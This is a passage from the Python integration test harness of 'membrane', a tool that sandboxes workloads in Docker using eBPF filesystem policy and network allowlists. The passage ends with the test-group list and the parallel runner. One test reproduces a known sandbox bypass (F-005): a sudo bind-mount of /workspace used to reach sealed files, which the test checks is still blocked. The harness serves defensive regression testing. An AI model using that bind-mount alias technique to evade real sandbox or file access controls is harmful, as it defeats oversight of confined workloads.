        os.write(master, b"membrane-terminal-input\n")
        deadline = time.monotonic() + 10
        while "TTY INPUT membrane-terminal-input" not in terminal.output() and time.monotonic() < deadline:
            time.sleep(0.1)
        check(ctx, "TTY INPUT membrane-terminal-input" in terminal.output(), "terminal input reaches workload")
        os.write(master, b"\x03")
        terminal.wait(expected=130)
        check(ctx, termios.tcgetattr(slave) == terminal.terminal_state, "terminal settings restored after Ctrl-C")
        trace_events(ctx, terminal.directory / "trace.jsonl.gz")
        cleaned(ctx, terminal)


def update_snapshot_workspace(ctx, session, changes):
    # Send Python over stdin so SSH cannot reinterpret paths or multiline code.
    # Colima's login user owns the shared workspace; native Linux uses the same
    # user as this runner. No container exec or session cgroup is involved.
    command = (["colima", "ssh", "--profile", "membrane", "--", "python3", "-"]
               if sys.platform == "darwin" else [sys.executable, "-"])
    script = f"""import os
from pathlib import Path
directory = Path({str(session.directory)!r})
session_id = {session.id!r}
cgroup = next(line.split(':', 2)[2] for line in Path('/proc/self/cgroup').read_text().splitlines()
              if line.startswith('0::'))
parents = {{'membrane-' + session_id, 'membrane' + session_id + '.slice'}}
if parents.intersection(Path(cgroup).parts):
    raise RuntimeError('host mutator is inside session cgroup: ' + cgroup)
print('PASS trusted Docker-host mutator outside session cgroup: ' + cgroup, flush=True)
"""
    result = run(ctx, command, input=script + changes + '\n(directory / "continue").touch()\n')
    ctx.output.extend(line for line in result.stdout.splitlines() if line.startswith("PASS "))


def group_30(ctx):
    build_trace_workload(ctx)
    host = ["colima", "ssh", "--profile", "membrane", "--", "sudo", "-n"] if sys.platform == "darwin" else (["sudo", "-n"] if os.geteuid() != 0 else [])
    info = json.loads(run(ctx, ["docker", "info", "--format", "{{json .}}"], ).stdout)
    arch = {"aarch64": "arm64", "x86_64": "amd64"}.get(info["Architecture"], info["Architecture"])
    run(ctx, ["go", "build", "-buildvcs=false", "-o", str(ctx.workdir / "policy-dind"),
              str(REPO_ROOT / "scripts/testdata/policy-dind.go")],
        env=dict(ctx.environment, CGO_ENABLED="0", GOOS="linux", GOARCH=arch))
    for name in ("a", "b", "failed", "snapshot", "late", "death"):
        directory = ctx.workdir / name
        directory.mkdir()
        copy_policy_workload(directory)
    a_dir, b_dir = ctx.workdir / "a", ctx.workdir / "b"
    (a_dir / "protected").write_text("sealed\n")
    (a_dir / "readonly").write_text("readonly\n")
    (a_dir / ".membrane.yaml").write_text("ignore: [protected]\nreadonly: [readonly]\n")
    (b_dir / "other").write_text("B sealed\n")
    os.link(a_dir / "protected", b_dir / "protected")
    os.link(b_dir / "other", a_dir / "other")
    (b_dir / ".membrane.yaml").write_text("ignore: [other]\n")
    shutil.copy2(ctx.workdir / "policy-dind", a_dir / "policy-dind")
    with ExitStack() as stack:
        a = stack.enter_context(Session(ctx, a_dir, ["sudo", "python3", "/workspace/policy-workload.py", "hold"], options=["--no-trace"]))
        a.wait_for("ready")
        b = stack.enter_context(Session(ctx, b_dir, ["sudo", "python3", "/workspace/policy-workload.py", "ordinary"], options=["--trace-log=" + str(b_dir / "trace.jsonl.gz")]))
        b.wait_for("ready")
        check_handler(ctx, a, traced=False, policy=True)
        check_handler(ctx, b, traced=True, policy=True)
        agent_a, agent_b = inspect(ctx, "membrane-agent-" + a.id), inspect(ctx, "membrane-agent-" + b.id)
        check(ctx, a.id != b.id and agent_a["HostConfig"]["CgroupParent"] != agent_b["HostConfig"]["CgroupParent"], "concurrent policy sessions have distinct cgroups")
        for session in (a, b):
            pins = "/sys/fs/bpf/membrane/" + session.id
            for name in ("policy_cgroup", "policy_inodes", "policy_controller", "policy_file_open"):
                run(ctx, [*host, "test", "-f", pins + "/" + name])
            check(ctx, True, session.directory.name + ": own pinned maps and enforcement links")
        run(ctx, ["docker", "exec", "membrane-handler-" + a.id, "test", "!", "-d", "/trace"])
        check(ctx, (a_dir / "protected").read_text() == "other session write\n", "other session can mutate the same inode")
        run(ctx, ["docker", "exec", "-u", "root", "membrane-agent-" + a.id, "cat", "/workspace/other"])
        run(ctx, ["docker", "run", "--rm", "--network=none", "-v", str(a_dir) + ":/data", "--entrypoint=python3", "membrane-agent", "-c",
                  "from pathlib import Path; p=Path('/data/protected'); p.read_bytes(); p.write_text('unrelated write\\n')"])
        check(ctx, True, "unrelated Docker container remains unrestricted")
        # Explicit original exploit, executing as sandbox root through sudo.
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "mkdir", "-p", "/tmp/workspace-copy"])
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "mount", "--bind", "/workspace", "/tmp/workspace-copy"])
        probe = """import errno, os
for name, readable in [('protected', False), ('readonly', True)]:
 for flags, allowed in [(os.O_RDONLY, readable), (os.O_WRONLY, False)]:
  try: fd = os.open('/tmp/workspace-copy/' + name, flags)
  except OSError as e:
   if allowed or e.errno != errno.EACCES: raise
  else:
   os.close(fd)
   if not allowed: raise RuntimeError('mount alias bypass: ' + name)
"""
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "python3", "-c", probe])
        check(ctx, True, "F-005 sudo bind-mount alias preserves sealed/readonly policy")
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "/workspace/policy-dind"], timeout=90)
        check(ctx, True, "inner Docker descendant remains subject to policy")
        b.release(); b.wait(); trace_events(ctx, b_dir / "trace.jsonl.gz"); cleaned(ctx, b)
        a.release(); a.wait(); cleaned(ctx, a)

    env = trace_docker_env(ctx)
    failed_dir = ctx.workdir / "failed"
    (failed_dir / "protected").write_text("secret\n")
    (failed_dir / ".membrane.yaml").write_text("ignore: [protected]\n")
    with Session(ctx, failed_dir, ["touch", "/workspace/first-instruction"], options=["--no-trace"], env=dict(env, FAIL_BPF="1")) as failed:
        output = failed.wait(expected=None)
        check(ctx, failed.process.returncode != 0 and "load filesystem policy BPF" in output, "LSM setup failure aborts clearly")
        check(ctx, not (failed_dir / "first-instruction").exists(), "failed policy never starts workload")
        cleaned(ctx, failed)

    directory = ctx.workdir / "snapshot"
    for name in ("late", "moved", "tree"):
        (directory / name).mkdir()
    (directory / ".env").write_text("startup sealed\n")
    os.link(directory / ".env", directory / "old-alias")
    (directory / "ordinary").write_text("ordinary\n")
    (directory / "readonly-old").write_text("readonly original\n")
    (directory / ".membrane.yaml").write_text("ignore: [.env, tree/]\nreadonly: [readonly-old]\n")
    with Session(ctx, directory, ["sudo", "python3", "/workspace/policy-workload.py", "snapshot"], options=["--no-trace"]) as snapshot:
        snapshot.wait_for("ready")
        update_snapshot_workspace(ctx, snapshot, r'''
(directory / ".env").rename(directory / "renamed-env")
(directory / ".env").write_text("replacement\n")
(directory / "late/.env").write_text("late\n")
(directory / "ordinary").rename(directory / "moved/.env")
(directory / "temp").write_text("replacement\n")
os.replace(directory / "temp", directory / "readonly-old")
(directory / "tree/new").write_text("new\n")
''')
        output = snapshot.wait()
        ctx.output.extend(line for line in output.splitlines() if line.startswith("PASS "))
        cleaned(ctx, snapshot)

    directory = ctx.workdir / "late"
    (directory / ".membrane.yaml").write_text("ignore: [.env]\n")
    with Session(ctx, directory, ["sudo", "python3", "/workspace/policy-workload.py", "late-only"], options=["--no-trace"]) as late:
        late.wait_for("ready")
        check_handler(ctx, late, traced=False)
        check(ctx, not inspect(ctx, "membrane-agent-" + late.id)["HostConfig"]["CgroupParent"], "empty snapshot does not create a BPF cgroup")
        update_snapshot_workspace(ctx, late, r'(directory / ".env").write_text("late\n")')
        output = late.wait()
        ctx.output.extend(line for line in output.splitlines() if line.startswith("PASS "))
        cleaned(ctx, late)

    directory = ctx.workdir / "death"
    (directory / "protected").write_text("secret\n")
    (directory / ".membrane.yaml").write_text("ignore: [protected]\n")
    with Session(ctx, directory, ["sudo", "python3", "/workspace/policy-workload.py", "hold"], options=["--no-trace"]) as death:
        death.wait_for("ready")
        # Pause CLI teardown to make the otherwise tiny controller-death window
        # deterministic. Keep the handler alive too, so its controller is the
        # only process deliberately killed here. The workload still runs.
        handler = "membrane-handler-" + death.id
        agent = "membrane-agent-" + death.id
        handler_pid = str(inspect(ctx, handler)["State"]["Pid"])
        processes = run(ctx, ["docker", "top", handler, "-eo", "pid,comm"]).stdout.splitlines()[1:]
        tracer_pids = [line.split()[0] for line in processes if line.split()[-1] == "tracer"]
        check(ctx, len(tracer_pids) == 1, "one handler-side BPF controller")
        os.kill(death.process.pid, signal.SIGSTOP)
        try:
            run(ctx, [*host, "kill", "-STOP", handler_pid])
            run(ctx, [*host, "kill", "-KILL", tracer_pids[0]])
            run(ctx, [*host, "test", "-f", "/sys/fs/bpf/membrane/" + death.id + "/policy_file_open"])
            death.release()
            deadline = time.monotonic() + 15
            while "PASS held policy remains active" not in death.output() and time.monotonic() < deadline:
                time.sleep(0.05)
            check(ctx, "PASS held policy remains active" in death.output(), "live workload denied after controller SIGKILL")
            check(ctx, inspect(ctx, handler)["State"]["Running"], "policy persists while handler teardown is paused")
        finally:
            os.kill(death.process.pid, signal.SIGCONT)
            run(ctx, [*host, "kill", "-CONT", handler_pid], expected=None)
        death.wait(expected=None)
        cleaned(ctx, death)


@dataclass(frozen=True)
class TestGroup:
    description: str
    run: Callable[[Context], None]


GROUPS = {
    1: TestGroup("hostname HTTP passthrough", group_1),
    2: TestGroup("URL allowlist prefixes", group_2),
    3: TestGroup("HTTP method restrictions", group_3),
    4: TestGroup("HTTP methods with URL prefixes", group_4),
    5: TestGroup("absolute HTTP path rules", group_5),
    6: TestGroup("relative HTTP path rules", group_6),
    7: TestGroup("multiple HTTP rules per destination", group_7),
    8: TestGroup("multiple allowlist destinations", group_8),
    9: TestGroup("default-deny host policy", group_9),
    10: TestGroup("CLI hostname and URL allowlists", group_10),
    11: TestGroup("DNS filtering and resolver bypass", group_11),
    12: TestGroup("HTTP path boundaries", group_12),
    13: TestGroup("HTTP rules on hostname destinations", group_13),
    14: TestGroup("sealed filesystem objects (ignore)", group_14),
    15: TestGroup("HTTP rules on IP destinations", group_15),
    16: TestGroup("multi-question DNS rejection", group_16),
    17: TestGroup("UDP default deny and port opt-in", group_17),
    18: TestGroup("HTTP path traversal rejection", group_18),
    19: TestGroup("raw TCP with HTTP-only host rules", group_19),
    20: TestGroup("combined URL and HTTP path constraints", group_20),
    21: TestGroup("raw TCP with HTTP-only IP rules", group_21),
    22: TestGroup("HTTPS rules on nonstandard ports", group_22),
    23: TestGroup("wildcard subdomains and apex exclusion", group_23),
    24: TestGroup("all-host wildcard and port restrictions", group_24),
    25: TestGroup("eBPF tracing and session isolation", group_25),
    26: TestGroup("readonly filesystem paths", group_26),
    27: TestGroup("filesystem policy precedence", group_27),
    28: TestGroup("tracing modes and failure handling", group_28),
    29: TestGroup("traced workload lifecycle and terminal I/O", group_29),
    30: TestGroup("filesystem LSM isolation, lifecycle and startup snapshot", group_30),
}


def run_group(number, membrane_cmd, environment, artifacts, keep_artifacts):
    output = [f"=== {number:02}: {GROUPS[number].description} ==="]
    directory = None
    passed = False
    try:
        directory = Path(tempfile.mkdtemp(prefix=f"membrane-test-{number:02}-", dir=artifacts))
        ctx = Context(number, membrane_cmd, directory, environment.copy(), output)
        GROUPS[number].run(ctx)
        passed = True
    except TestFailure as error:
        output.append("FAIL " + str(error))
    except Exception:
        output.append("FAIL " + traceback.format_exc())
    if directory is not None:
        try:
            if keep_artifacts or not passed:
                # Copy handler logs alongside the exact command output and inputs.
                for idfile in directory.rglob("session-id*"):
                    session_id = idfile.read_text().strip()
                    if not session_id:
                        continue
                    log = Path.home() / ".membrane/logs" / f"membrane-handler-{session_id}.log"
                    if not log.exists():
                        log = log.with_suffix(".log.gz")
                    if log.exists():
                        shutil.copy2(log, directory / log.name)
                        output.append(f"Handler log: {directory / log.name}")
                output.append(f"Artifacts retained: {directory}")
                (directory / "result.log").write_text("\n".join(output) + "\n")
            else:
                shutil.rmtree(directory)
        except Exception as error:
            passed = False
            output.append(f"FAIL artifact cleanup/reporting: {error}\nArtifacts retained: {directory}")
    return passed, "\n".join(output) + "\n"


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-g", "--group", action="append", metavar="GROUPS",
                        help="group numbers, comma-separated or repeated (default: all)")
    parser.add_argument("-l", "--list", action="store_true", help="list groups and exit")
    parser.add_argument("-j", "--jobs", type=int, metavar="N", help="concurrent groups (default: CPU count)")
    parser.add_argument("--keep-artifacts", action="store_true", help="retain successful group artifacts too")
    parser.add_argument("--no-warmup", action="store_true", help="skip the one-time image and binary warmup")
    args = parser.parse_args()
    if args.jobs is not None and args.jobs < 1:
        parser.error("--jobs must be at least 1")
    selected = set(GROUPS)
    if args.group is not None:
        try:
            selected = {int(value) for flag in args.group for value in flag.split(",")}
        except ValueError:
            parser.error("--group requires comma-separated group numbers")
        unknown = selected - GROUPS.keys()
        if unknown:
            parser.error("unknown group(s): " + ", ".join(map(str, sorted(unknown))))
    if args.list:
        for number, group in GROUPS.items():
            print(f"{number:<3} {group.description}")
        return 0

    environment = dict(os.environ)
    if sys.platform == "darwin":
        environment.setdefault("DOCKER_CONTEXT", "colima-membrane")
    membrane_cmd = environment.get("MEMBRANE_CMD", str(REPO_ROOT / "membrane"))
    # Resolve explicit relative paths before workers change their subprocess cwd.
    if os.sep in membrane_cmd:
        membrane_cmd = str(Path(membrane_cmd).expanduser().resolve())
    if not args.no_warmup:
        print("=== Warmup ===", flush=True)
        try:
            result = run(None, [str(REPO_ROOT / "scripts/run-dev.sh"), "--no-update", "--no-trace",
                                "--no-global-config", "--", "echo", "ok"],
                         cwd=REPO_ROOT, env=environment, timeout=1800)
        except TestFailure as error:
            print(f"FAIL {error}")
            return 1
        print(result.stdout + result.stderr, end="", flush=True)

    if sys.platform == "linux" and os.geteuid() != 0 and selected.intersection({14, 25, 26, 27, 28, 29, 30}):
        print("membrane tests: requesting sudo for BPF session setup and cleanup", file=sys.stderr, flush=True)
        # Authenticate after the build, in the foreground before workers
        # redirect I/O. Native workers retain this terminal via start_process().
        try:
            subprocess.run(["sudo", "-v"], check=True)
        except (OSError, subprocess.CalledProcessError) as error:
            print(f"FAIL host sudo authentication: {error}", file=sys.stderr)
            return 1

    # Home is shared by Colima, whereas macOS /private/tmp need not be.
    artifacts = Path.home() / ".membrane/tmp"
    artifacts.mkdir(parents=True, exist_ok=True)
    jobs = args.jobs if args.jobs is not None else min(len(selected), os.cpu_count() or 4)
    failed = []
    with ThreadPoolExecutor(max_workers=jobs) as executor:
        futures = {executor.submit(run_group, number, membrane_cmd, environment, artifacts,
                                   args.keep_artifacts): number for number in sorted(selected)}
        for future in as_completed(futures):
            passed, output = future.result()
            print(output, flush=True)
            if not passed:
                failed.append(futures[future])
    print(f"{len(selected) - len(failed)} passed, {len(failed)} failed")
    for number in sorted(failed):
        print(f"Failed {number:02}: {GROUPS[number].description}")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
